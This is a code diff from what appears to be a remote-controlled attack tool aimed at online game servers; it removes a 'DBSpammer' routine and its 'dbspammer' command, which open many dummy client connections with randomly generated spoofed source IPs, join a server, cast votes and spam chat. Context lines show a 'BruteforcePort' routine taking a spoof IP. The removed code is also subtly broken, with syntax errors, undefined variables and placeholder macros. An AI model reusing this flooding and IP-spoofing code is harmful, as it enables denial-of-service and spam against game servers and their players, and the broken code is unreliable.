@@ -611,91 +611,6 @@ void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
 	}
 }
 
-void DBSpammer(const char *SrvIP, int Port, int Amount)
-{
-	// send the dummies
-	for(l = 0; l < Amount/2; l++)
-	{
-		AmountofDummies = Amount; // for tick (keep alive)
-
-		int i;
-		for(i = 0; i < Amount; i++)
-		{
-			if (!Create(&m_Sock[i]))
-				Close(i);
-		}
-
-		// generate IPs
-		for (int k = 0; k < Amount; k++)
-		{
-			m_FromIP[k] = inet_addr(GenIPChar());
-		}
-
-		m_FromPort = htons(1111);
-
-		m_ToIP = inet_addr(IP);
-		m_ToPort = htons(Port);
-		unsigned char buffer[2048];
-
-		int BufferSize = 0;
-		int l = 0;
-		int j = 0;
-
-		for(j = 0; j < Amount; j++)
-		{
-			Reset(j);
-
-			ZeroMemory(buffer, sizeof(buffer));
-			BufferSize = PackConnect(&buffer[0], j);
-			SendData((const char*)buffer, BufferSize, j);
-
-			//Debug(&buffer[0], BufferSize);
-
-			ZeroMemory(buffer, sizeof(buffer));
-			BufferSize = PackClientInfo(&buffer[0], j);
-			SendData((const char*)buffer, BufferSize, j);
-
-			//Debug(&buffer[0], BufferSize);
-
-			ZeroMemory(buffer, sizeof(buffer));
-			BufferSize = PackReady(&buffer[0], j);
-			SendData((const char*)buffer, BufferSize, j);
-
-			//Debug(&buffer[0], BufferSize);
-
-			ZeroMemory(buffer, sizeof(buffer));
-			BufferSize = PackSendInfo(&buffer[0], j);
-			SendData((const char*)buffer, BufferSize, j);
-
-			//Debug(&buffer[0], BufferSize);
-
-			ZeroMemory(buffer, sizeof(buffer));
-			BufferSize = PackEnterGame(&buffer[0], j);
-			SendData((const char*)buffer, BufferSize, j);
-
-			//Debug(&buffer[0], BufferSize);
-
-			// one alive packet right after joining...
-			ZeroMemory(buffer, 2048);
-			BufferSize = PackKeepAlive(&buffer[0], j);
-			SendData((const char*)buffer, BufferSize, j);
-
-			//Debug(&buffer[0], BufferSize);
-
-			ZeroMemory(buffer, 2048);
-			BufferSize = PackVote(&buffer[0], j, Vote);
-			SendData((const char*)buffer, BufferSize, j);
-
-			// send dem login try
-			char aBuf[128];
-			str_format(aBuf, sizeof(aBuf), "%s ", HIER_COOLER_RANDOM_STRING_XD);
-			SendChat(SrvIP, Port, FRUCHTI_HIER_AKTUELLE_SPOOF_IP_STRING, HIER_SPOOF_PORT, aBuf)
-		}
-		Sleep(200);
-		DisconnectDummies();
-	}
-}
-
 void Tick()
 {
 	if (m_Tick > 500) // once in 500 ms
@@ -913,19 +828,6 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: bruteport <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: bruteport <srvip> <srvport> <spoofip>"), 0);
-			}
-			else if(strcmp(aCmd[0], "dbspammer") == 0)
-			{
-				if(aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
-				{
-					int Port = atoi(aCmd[2]);
-					int Amount = atoi(aCmd[3]);
-					DBSpammer(aCmd[1], Port, Amount);
-
-					send(g_Client, "[Server]: Dummies for dbspamming connected!", strlen("[Server]: Dummies for dbspamming connected!"), 0);
-				}
-				else
-					send(g_Client, "[Server]: Please use: dbport <srvip> <srvport> <amount>", strlen("[Server]: Please use: dbport <srvip> <srvport> <amount>", 0);
 			}
 			else
 				send(g_Client, "[Server]: Unknown command.", strlen("[Server]: Unknown command."), 0);
